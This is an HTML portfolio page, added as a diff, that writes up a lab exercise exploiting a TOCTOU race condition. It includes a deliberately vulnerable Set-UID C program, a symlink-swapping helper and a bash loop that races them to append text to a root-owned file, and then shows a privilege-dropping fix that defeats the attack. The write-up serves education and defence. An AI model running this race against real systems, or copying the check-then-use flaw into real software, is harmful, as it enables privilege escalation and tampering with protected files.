@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Race Condition (TOCTOU) Vulnerability</title>
+<style>
+:root {
+  --bg: #0a0a0f;
+  --bg-secondary: #12121a;
+  --bg-card: #1a1a2e;
+  --text: #e0e0e0;
+  --text-secondary: #c8c8d8;
+  --text-muted: #9898a8;
+  --primary: #00d4ff;
+  --primary-dim: rgba(0, 212, 255, 0.15);
+  --accent: #7c3aed;
+  --border: rgba(255, 255, 255, 0.08);
+  --border-glow: rgba(0, 212, 255, 0.3);
+  --font-sans: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  --font-mono: "JetBrains Mono", "Fira Code", "SF Mono", Consolas, monospace;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: var(--font-sans); line-height: 1.7; min-height: 100vh; }
+.back-link { position: fixed; top: 20px; left: 20px; color: var(--primary); text-decoration: none; font-size: 14px; font-weight: 500; display: flex; align-items: center; gap: 6px; z-index: 100; background: var(--bg-card); padding: 8px 16px; border-radius: 20px; border: 1px solid var(--border); transition: all 0.3s ease; }
+.back-link:hover { border-color: var(--border-glow); box-shadow: 0 0 15px rgba(0, 212, 255, 0.2); }
+.hero { padding: 80px 40px 40px; text-align: center; border-bottom: 1px solid var(--border); background: linear-gradient(180deg, rgba(0, 212, 255, 0.03) 0%, transparent 100%); }
+.hero h1 { font-size: clamp(24px, 4vw, 36px); font-weight: 700; color: #fff; margin-bottom: 12px; letter-spacing: -0.5px; }
+.hero .meta { color: var(--text-muted); font-size: 14px; display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
+.hero .meta span { display: flex; align-items: center; gap: 6px; }
+.container { max-width: 880px; margin: 0 auto; padding: 40px 24px 80px; }
+h2 { font-size: 22px; font-weight: 600; color: #fff; margin-top: 48px; margin-bottom: 16px; padding-bottom: 8px; border-bottom: 2px solid var(--primary); display: inline-block; }
+h3 { font-size: 17px; font-weight: 600; color: var(--text); margin-top: 28px; margin-bottom: 10px; }
+p { margin: 12px 0; font-size: 15px; color: var(--text-secondary); }
+strong { color: var(--text); }
+ul, ol { margin: 12px 0; padding-left: 24px; }
+li { margin: 6px 0; font-size: 15px; color: var(--text-secondary); }
+code { background: var(--bg-secondary); color: var(--primary); padding: 2px 7px; border-radius: 4px; font-family: var(--font-mono); font-size: 13px; border: 1px solid var(--border); }
+pre { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 16px 20px; overflow-x: auto; font-family: var(--font-mono); font-size: 13px; color: var(--text); margin: 16px 0; }
+pre code { background: none; border: none; padding: 0; color: inherit; }
+.screenshot { margin: 20px 0; border: 1px solid var(--border); border-radius: 10px; overflow: hidden; transition: all 0.3s ease; }
+.screenshot:hover { border-color: var(--border-glow); box-shadow: 0 4px 20px rgba(0, 212, 255, 0.1); }
+.screenshot img { display: block; width: 100%; height: auto; cursor: pointer; }
+.screenshot-caption { font-size: 12px; color: var(--text-muted); padding: 10px 14px; background: var(--bg-secondary); border-top: 1px solid var(--border); }
+table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14px; }
+th { text-align: left; color: var(--text-muted); font-weight: 500; padding: 10px 14px; border-bottom: 1px solid var(--border); text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
+td { padding: 10px 14px; border-bottom: 1px solid var(--border); color: var(--text-secondary); }
+hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+.takeaways { background: var(--bg-secondary); border-left: 3px solid var(--primary); padding: 20px 24px; border-radius: 0 10px 10px 0; margin: 24px 0; }
+.takeaways li { color: var(--text); }
+.tags { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
+.tag { background: var(--primary-dim); color: var(--primary); padding: 5px 12px; border-radius: 100px; font-size: 12px; font-weight: 500; border: 1px solid rgba(0, 212, 255, 0.2); }
+.lightbox { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; cursor: pointer; }
+.lightbox.active { display: flex; }
+.lightbox img { max-width: 95vw; max-height: 95vh; object-fit: contain; border-radius: 4px; }
+@media (max-width: 640px) { .hero { padding: 60px 20px 30px; } .container { padding: 24px 16px 60px; } h2 { font-size: 19px; } }
+</style>
+</head>
+<body>
+
+<a href="javascript:history.back()" class="back-link">&#x2190; Back to Portfolio</a>
+
+<div class="hero">
+  <h1>Race Condition (TOCTOU) Vulnerability</h1>
+  <div class="meta">
+    <span>&#x1F4C2; Ethical Hacking</span>
+    <span>&#x1F4C5; 2023</span>
+    <span>&#x1F393; MSIA Program</span>
+  </div>
+</div>
+
+<div class="container">
+<h1>TOCTOU / Race Condition Vulnerability Exploitation</h1>
+<h2>Project Overview</h2>
+<p>In this security research project, I explored and exploited a <strong>Time-of-Check to Time-of-Use (TOCTOU)</strong> vulnerability—a critical class of race conditions that can allow unprivileged users to escalate privileges and modify protected system files.</p>
+<p>The core issue: when a program checks if a user has permission to access a file, there exists a small but exploitable time window before that file is actually used. A malicious attacker can swap the target file during this window using symbolic links, causing the privileged program to operate on an unintended file. The impact is significant—with Set-UID binaries running as root, an attacker can write arbitrary data to system files like <code>/etc/shadow</code>.</p>
+<h2>Technical Background</h2>
+<h3>Understanding TOCTOU Attacks</h3>
+<p>A race condition occurs when multiple operations that should execute sequentially instead attempt to run simultaneously. The outcome depends on which operation completes last, making timing critical. In the context of TOCTOU:</p>
+<ol>
+<li><strong>Time-of-Check</strong>: The program verifies that the current user has write permission to a file using the <code>access()</code> system call</li>
+<li><strong>Time-of-Use</strong>: After the check passes, the program opens and writes to that file with <code>fopen()</code></li>
+<li><strong>The Window</strong>: Between these two calls exists a small time interval where an attacker can change what file the program actually operates on</li>
+</ol>
+<h3>Privilege Escalation via Symbolic Links</h3>
+<p>In Unix systems, symbolic links (symlinks) point to file paths rather than containing the file data directly. An attacker can exploit the TOCTOU window by:</p>
+<ul>
+<li>Creating a symlink with the same name as the file the victim checks</li>
+<li>Pointing it to a protected system file (like <code>/etc/shadow</code>)</li>
+<li>When the vulnerable program performs its operation, it works on the attacker-specified file instead—with the program's elevated privileges</li>
+</ul>
+<h2>Environment Setup</h2>
+<p>I developed and tested this exploit in the following environment:</p>
+<ul>
+<li><strong>Platform</strong>: Kali Linux running in VirtualBox</li>
+<li><strong>Programming Language</strong>: C with Clang compiler</li>
+<li><strong>System Calls</strong>: <code>access()</code>, <code>fopen()</code>, <code>symlink()</code>, <code>seteuid()</code></li>
+<li><strong>Tools</strong>: Bash scripting for attack automation, standard Unix utilities</li>
+</ul>
+<h3>Initial Configuration</h3>
+<p>I created a non-root user account on Kali Linux, as the default installation runs everything as root. This setup ensured I could properly test privilege escalation attacks.</p>
+<p><div class="screenshot"><img src="images/image_001.png" alt="Creating a non-root user account (laxman) on Kali Linux for privilege escalation testing" loading="lazy"><div class="screenshot-caption">Creating a non-root user account (laxman) on Kali Linux for privilege escalation testing</div></div></p>
+<h2>Phase 1: Building the Vulnerable Program</h2>
+<p>I analyzed and compiled a C program intentionally vulnerable to TOCTOU attacks. The program serves as the target for exploitation:</p>
+<pre><code class="language-c">/* vulnerable-program.c - Vulnerable to TOCTOU attack */
+#include &lt;stdio.h&gt;
+#include&lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+#define DELAY 50000
+
+int main(int argc, char * argv[]){
+    char * fileName = argv[1];
+    char buffer[60];
+    int i;
+    FILE * fileHandler;
+
+    /* Get user input */
+    scanf(&quot;%50s&quot;, buffer);
+
+    if(!access(fileName, W_OK)) {
+        /* Simulate delay to widen the exploitation window */
+        for(i = 0; i &lt; DELAY; i++) {
+            int a = i ^ 2;
+        }
+
+        /* Vulnerable window: file checked, now being used */
+        fileHandler = fopen(fileName, &quot;a+&quot;);
+        fwrite(&quot;n&quot;, sizeof(char), 1, fileHandler);
+        fwrite(buffer, sizeof(char), strlen(buffer), fileHandler);
+        fwrite(&quot;n&quot;, sizeof(char), 1, fileHandler);
+        fclose(fileHandler);
+    } else {
+        printf(&quot;No permission n&quot;);
+    }
+}
+</code></pre>
+
+<h3>Compilation and Privilege Setup</h3>
+<p>I compiled the program as root using Clang:</p>
+<p><div class="screenshot"><img src="images/image_002.png" alt="Compiling the vulnerable program with Clang as root" loading="lazy"><div class="screenshot-caption">Compiling the vulnerable program with Clang as root</div></div></p>
+<p>I then set the Set-UID bit to ensure it runs with elevated privileges. The Set-UID bit is critical—it allows an unprivileged user to run the program with root privileges, making the privilege escalation possible:</p>
+<p><div class="screenshot"><img src="images/image_003.png" alt="Setting the Set-UID bit with chmod u+s and verifying it on the compiled binary" loading="lazy"><div class="screenshot-caption">Setting the Set-UID bit with chmod u+s and verifying it on the compiled binary</div></div></p>
+<h2>Phase 2: Setting Up the Attack Infrastructure</h2>
+<h3>Creating the Target File</h3>
+<p>I created a protected file owned by root to serve as the attack target:</p>
+<p><div class="screenshot"><img src="images/image_004.png" alt="Root-owned file created to demonstrate file overwrite capability" loading="lazy"><div class="screenshot-caption">Root-owned file created to demonstrate file overwrite capability</div></div></p>
+<p>This <code>passwd</code> file simulates a sensitive system file that normally cannot be modified by unprivileged users.</p>
+<h3>Writing the Symlink Generator</h3>
+<p>To automatically create symbolic links during the exploitation window, I wrote a companion program:</p>
+<pre><code class="language-c">/* symbolic-link.c - Rapid symlink creation */
+#include &lt;stdio.h&gt;
+#include&lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char * argv[]) {
+    unlink(argv[1]);
+    symlink(&quot;./passwd&quot;, argv[1]);
+}
+</code></pre>
+<p>This program removes any existing file/symlink at the target location and creates a new symlink pointing to the protected file.</p>
+<p><div class="screenshot"><img src="images/image_005.png" alt="Compiling the symlink generator program" loading="lazy"><div class="screenshot-caption">Compiling the symlink generator program</div></div></p>
+<h2>Phase 3: Exploiting the Vulnerability</h2>
+<h3>Automated Attack Script</h3>
+<p>I developed a bash script to automate the exploitation process. Since the TOCTOU window is extremely narrow, I needed to execute the attack repeatedly until timing aligned correctly:</p>
+<pre><code class="language-bash">#!/bin/sh
+# exploit.sh - Automated TOCTOU attack with retry logic
+
+old=`ls -l passwd`
+new=`ls -l passwd`
+
+while [ &quot;$old&quot; = &quot;$new&quot; ]
+do 
+    rm passwdlocal
+    echo &quot;This is a file that the user can overwrite&quot; &gt; passwdlocal
+
+    # Run both programs in parallel to race them
+    echo &quot;TOCTOU-Attack-Success&quot; | ./vulnerable-program passwdlocal &amp; 
+    ./symbolic-link passwdlocal &amp; 
+
+    new=`ls -l passwd`
+done
+
+echo &quot;STOP... The passwd file has been changed&quot;
+</code></pre>
+<p>The script:
+1. Creates a local file that the user can modify
+2. Launches both the vulnerable program and symlink generator in parallel
+3. Continuously monitors the protected <code>passwd</code> file for changes
+4. Repeats until successful modification occurs</p>
+<h3>Successful Exploitation</h3>
+<p>I ran the exploit script, and after multiple iterations, the attack succeeded:</p>
+<p><div class="screenshot"><img src="images/image_006.png" alt="Successful TOCTOU exploit showing repeated attack attempts and final success" loading="lazy"><div class="screenshot-caption">Successful TOCTOU exploit showing repeated attack attempts and final success</div></div></p>
+<p>The script executed numerous times before the timing aligned perfectly. During one iteration, my symlink creation occurred within the critical window between <code>access()</code> and <code>fopen()</code>, causing the vulnerable program to write data to the root-owned <code>passwd</code> file instead of the user's temporary file.</p>
+<h2>Phase 4: Mitigation &amp; Defense</h2>
+<h3>The Fix</h3>
+<p>I implemented a robust mitigation by applying the principle of least privilege. The corrected program temporarily relinquishes root privileges before performing file operations:</p>
+<pre><code class="language-c">/* vulnerable-program-fix.c - Mitigated version */
+#include &lt;stdio.h&gt;
+#include&lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;string.h&gt;
+
+#define DELAY 50000
+
+int main(int argc, char * argv[]) {
+    char * fileName = argv[1];
+    char buffer[60];
+    int i;
+    FILE * fileHandler;
+
+    scanf(&quot;%50s&quot;, buffer);
+
+    if(!access(fileName, W_OK)) {
+        for(i = 0; i &lt; DELAY; i++) {
+            int a = i ^ 2;
+        }
+
+        /* THE FIX: Drop to real user privileges */
+        seteuid(getuid());
+
+        fileHandler = fopen(fileName, &quot;a+&quot;);
+        fwrite(&quot;n&quot;, sizeof(char), 1, fileHandler);
+        fwrite(buffer, sizeof(char), strlen(buffer), fileHandler);
+        fwrite(&quot;n&quot;, sizeof(char), 1, fileHandler);
+        fclose(fileHandler);
+    } else {
+        printf(&quot;No permission n&quot;);
+    }
+}
+</code></pre>
+<p>By calling <code>seteuid(getuid())</code>, the program drops its effective user ID to match the real user ID, preventing it from accessing or modifying files the unprivileged user cannot access.</p>
+<h3>Verification of the Fix</h3>
+<p>After recompiling the mitigated version and setting the Set-UID bit again, I re-ran my exploit:</p>
+<p><div class="screenshot"><img src="images/image_007.png" alt="Patched program compiled with SUID set, passwd reset, and exploit re-run — showing repeated 'No permission' denials" loading="lazy"><div class="screenshot-caption">Patched program compiled with SUID set, passwd reset, and exploit re-run — showing repeated &#x27;No permission&#x27; denials</div></div></p>
+<p>The exploit script now ran indefinitely without succeeding:</p>
+<p><div class="screenshot"><img src="images/image_008.png" alt="The attack fails against the patched version—the exploit cannot complete" loading="lazy"><div class="screenshot-caption">The attack fails against the patched version—the exploit cannot complete</div></div></p>
+<p>The attack could no longer write to the protected file because the program, once it verified permissions, immediately dropped its elevated privileges before performing the actual file operation.</p>
+<h2>Key Takeaways</h2>
+<ol>
+<li><strong>TOCTOU vulnerabilities are real and dangerous</strong>: The time window may be milliseconds, but race conditions can reliably be exploited with automated retry logic</li>
+<li><strong>Privilege separation is critical</strong>: Set-UID binaries require extreme care and minimal privilege elevation periods</li>
+<li><strong>Least privilege principle</strong>: Applications should only hold elevated privileges for as long as necessary</li>
+<li><strong>Symlink attacks are powerful</strong>: In Unix systems, symbolic links create opportunities for attackers to redirect operations to unintended targets</li>
+<li><strong>Defense requires atomic operations</strong>: The best fix is to perform permission checks and file operations atomically, or drop privileges before untrusted file operations</li>
+</ol>
+<h2>Tools &amp; Technologies Used</h2>
+<ul>
+<li><strong>Languages</strong>: C, Bash</li>
+<li><strong>Compilers</strong>: Clang</li>
+<li><strong>System Calls</strong>: <code>access()</code>, <code>fopen()</code>, <code>symlink()</code>, <code>seteuid()</code>, <code>getuid()</code>, <code>unlink()</code></li>
+<li><strong>Platforms</strong>: Kali Linux, VirtualBox</li>
+<li><strong>Concepts</strong>: Race conditions, Set-UID binaries, symbolic links, privilege escalation, secure coding</li>
+</ul>
+<h2>Skills Demonstrated</h2>
+<ul>
+<li>Vulnerability analysis and exploitation</li>
+<li>System call behavior and security implications</li>
+<li>Automated attack orchestration via scripting</li>
+<li>Secure coding practices and defensive mitigations</li>
+<li>Privilege escalation techniques</li>
+<li>Understanding of kernel-level security models</li>
+<li>Hands-on penetration testing methodology</li>
+</ul>
+</div>
+
+<div class="lightbox" id="lightbox" onclick="this.classList.remove('active')">
+  <img id="lightbox-img" src="" alt="Full size">
+</div>
+
+<script>
+document.querySelectorAll('.screenshot img').forEach(img => {
+  img.addEventListener('click', () => {
+    document.getElementById('lightbox-img').src = img.src;
+    document.getElementById('lightbox').classList.add('active');
+  });
+});
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') document.getElementById('lightbox').classList.remove('active');
+});
+</script>
+
+</body>
+</html>
